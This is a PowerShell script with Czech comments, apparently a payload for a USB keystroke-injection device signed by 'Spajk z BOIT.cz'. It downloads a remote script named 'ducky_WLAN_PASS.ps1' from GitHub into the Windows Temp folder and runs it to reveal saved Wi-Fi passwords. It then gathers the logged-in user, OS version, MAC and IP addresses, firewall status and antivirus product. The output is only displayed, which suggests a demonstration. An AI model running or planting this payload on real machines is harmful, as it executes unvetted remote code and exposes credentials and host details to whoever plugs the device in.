# Nastavení URL skriptu, který chcete stáhnout a spustit
$scriptUrl = "https://raw.githubusercontent.com/spajk-cz/omg/main/ducky_WLAN_PASS.ps1"

# Nastavení cesty, kam chcete skript uložit
$scriptPath = "C:\Windows\Temp\script.ps1"

# Stažení skriptu
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath

Write-Host "`n" # Prázdný řádek

Write-Host "Uložené Wi-Fi sítě a jejich hesla:"

Write-Host "`n" # Prázdný řádek

# Kontrola, zda byl skript úspěšně stažen
if (Test-Path $scriptPath) {
    # Spuštění staženého skriptu
    . $scriptPath
} else {
    Write-Host "Skript se nepodařilo stáhnout."
}

# Získání jména aktuálně přihlášeného uživatele
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Write-Host "Přihlášený uživatel: $currentUser"

Write-Host "`n" # Prázdný řádek

# Zjištění verze OS
$osInfo = Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer
Write-Host "Informace o Windows 11:" $osInfo

Write-Host "`n" # Prázdný řádek

# Zjištění MAC adresy aktivního síťového adaptéru
$macAddress = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -ExpandProperty MacAddress
Write-Host "MAC adresa: $macAddress"

Write-Host "`n" # Prázdný řádek

# Zjištění lokální IP adresy
$localIP = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.AddressState -eq "Preferred" -and $_.InterfaceAlias -notlike "Loopback*" } | Select-Object -ExpandProperty IPAddress
Write-Host "Lokální IP adresa: $localIP"

Write-Host "`n" # Prázdný řádek

# Zjištění veřejné IP adresy
$publicIP = Invoke-RestMethod -Uri "http://icanhazip.com"
Write-Host "Veřejná IP adresa: $publicIP"

Write-Host "`n" # Prázdný řádek

# Zjištění statusu firewallu
$firewallStatus = Get-NetFirewallProfile
Write-Host "Stav firewallu:"
foreach ($profile in $firewallStatus) {
    Write-Host "Profil: $($profile.Name), Povoleno: $($profile.Enabled)"
}
Write-Host "`n" # Prázdný řádek


Write-Host "`n" # Prázdný řádek

# Zjištění názvu nainstalovaného antivirového programu
$antivirusName = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName
Write-Host "Antivirus: $antivirusName"

Write-Host "`n" # Prázdný řádek

# Ping domů na BOIT.cz
$CtH = Test-Connection -ComputerName "boit.cz" -Count 1
Write-Host "Ping: $CtH"

Write-Host "`n" # Prázdný řádek


Write-Host "S pozdravem Spajk z BOIT.cz" 

Write-Host "`n" # Prázdný řádek
Write-Host -ForegroundColor DarkYellow "      ____   ____ _____ _______ "       
Write-Host -ForegroundColor DarkYellow "     |  _ \ / __ \_   _|__   __| "      
Write-Host -ForegroundColor DarkYellow "     | |_) | |  | || |    | |  ___ ____"
Write-Host -ForegroundColor DarkYellow "     |  _ <| |  | || |    | | / __|_  /"
Write-Host -ForegroundColor DarkYellow "     | |_) | |__| || |_   | || (__ / / "
Write-Host -ForegroundColor DarkYellow "     |____/ \____/_____|  |_(_)___/___|"

